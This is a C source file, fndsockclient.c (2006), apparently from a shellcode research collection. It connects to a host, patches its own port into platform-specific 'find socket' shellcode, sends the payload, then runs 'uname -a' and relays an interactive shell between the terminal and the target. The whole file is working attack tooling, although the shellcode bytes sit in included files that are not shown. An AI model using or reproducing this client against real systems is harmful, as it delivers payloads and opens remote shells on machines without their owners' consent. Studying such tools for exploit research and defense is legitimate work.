/*
 *  fndsockclient.c
 *  Copyright 2006 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/select.h>
#include <unistd.h>
#include <errno.h>

#if defined(_AIX)
#include "aix-power-fndsockcode.c"
#elif defined(__bsd__) && defined(__i386__)
#include "bsd-x86-fndsockcode.c"
#elif defined(__linux__) && defined(__powerpc64__)
#include "lin-power-fndsockcode64.c"
#elif defined(__linux__) && defined(__powerpc__)
#include "lin-power-fndsockcode.c"
#elif defined(__linux__) && defined(__i386__)
#include "lin-x86-fndsockcode.c"
#elif defined(__osx__) && defined(__i386__)
#include "osx-x86-fndsockcode.c"
#elif defined(__solaris__) && defined(__i386__)
#include "sol-x86-fndsockcode.c"
#else
#error "Unsupported operating system and/or architecture."
#endif

int
hexdump(char *buf, int len)
{
	int i, j;

	for (i=0; i<len; i++) {
		for (j=0; j<16; j++) {
			if (i+j >= len)
				printf("%3s","");
			else
				printf("%02x ", (unsigned char)buf[i+j]);
		}

		printf("%3s","");

		for (j=0; j<16; j++) {
			if (i+j >= len)
				printf("%1s","");
			else
				if (buf[i+j]>'\x1f' && buf[i+j]<'\x7f')
					printf("%c", buf[i+j]);
				else
					printf(".");
		}

		i += 15;

		printf("\n");
	}

	return 0;
}

int
main(int argc, char **argv)
{
	char *addr = "0.0.0.0";
	int port = 1234;
	int c, s;
	int debug = 0, verbose = 0;
	struct sockaddr_in sin;
	struct hostent *he;
	socklen_t sin_len = sizeof(sin);
	int count;

	while ((c = getopt(argc, argv, "a:dp:v")) != -1) {
		switch (c) {
		case 'a':
			addr = optarg;
			break;
		case 'd':
			debug = 1;
			break;
		case 'p':
			port = atoi(optarg);
			break;
		case 'v':
			verbose = 1;
		}
	}

	if (debug || verbose)
		printf("using %s:%d\n", addr, port);

	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	if ((sin.sin_addr.s_addr = inet_addr(addr)) == -1) {
		if ((he = gethostbyname(addr)) == NULL) {
			errno = EADDRNOTAVAIL;
			perror("gethostbyname");
			exit(EXIT_FAILURE);
		}
		memcpy(&sin.sin_addr.s_addr, he->h_addr, 4);
	}

	if (connect(s, (struct sockaddr *)&sin, sizeof(sin)) == -1) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if (debug || verbose)
		printf("connected to %s:%d\n", addr, port);

	if (getsockname(s, (struct sockaddr *)&sin, &sin_len)) {
		perror("getsockname");
		exit(EXIT_FAILURE);
	}

#if defined(__LP64__)
	fndsockcode64[FNDSOCKPORT] = (unsigned char)((ntohs(sin.sin_port)>>8)&0xff);
	fndsockcode64[FNDSOCKPORT+1] = (unsigned char)(ntohs(sin.sin_port)&0xff);

	if ((count = send(s, fndsockcode64, sizeof(fndsockcode64)-1, 0)) == -1) {
		perror("send");
		exit(EXIT_FAILURE);
	}

	if (debug)
		hexdump(fndsockcode64, sizeof(fndsockcode64)-1);

#else
	fndsockcode[FNDSOCKPORT] = (unsigned char)((ntohs(sin.sin_port)>>8)&0xff);
	fndsockcode[FNDSOCKPORT+1] = (unsigned char)(ntohs(sin.sin_port)&0xff);

	if ((count = send(s, fndsockcode, sizeof(fndsockcode)-1, 0)) == -1) {
		perror("send");
		exit(EXIT_FAILURE);
	}

	if (debug)
		hexdump(fndsockcode, sizeof(fndsockcode)-1);

#endif

	if (debug || verbose)
		printf("%d bytes sent\n", count);

	sleep(4);

	write(s, "uname -a\n", 9);
	while (1) {
		fd_set fds;
		int count;
		char buf[1024];

		FD_ZERO(&fds);
		FD_SET(0, &fds);
		FD_SET(s, &fds);
		if (select(FD_SETSIZE, &fds, NULL, NULL, NULL) == -1) {
			if (errno == EINTR)
				continue;
			perror("select");
			exit(EXIT_FAILURE);
		}
		if (FD_ISSET(0, &fds)) {
			if ((count = read(0, buf, sizeof(buf))) < 1) {
				if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)
					continue;
				else
					break;
			}
			write(s, buf, count);
		}
		if (FD_ISSET(s, &fds)) {
			if ((count = read(s, buf, sizeof(buf))) < 1) {
				if (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK)
					continue;
				else
					break;
			}
			write(1, buf, count);
		}
	}

	exit(EXIT_SUCCESS);
}

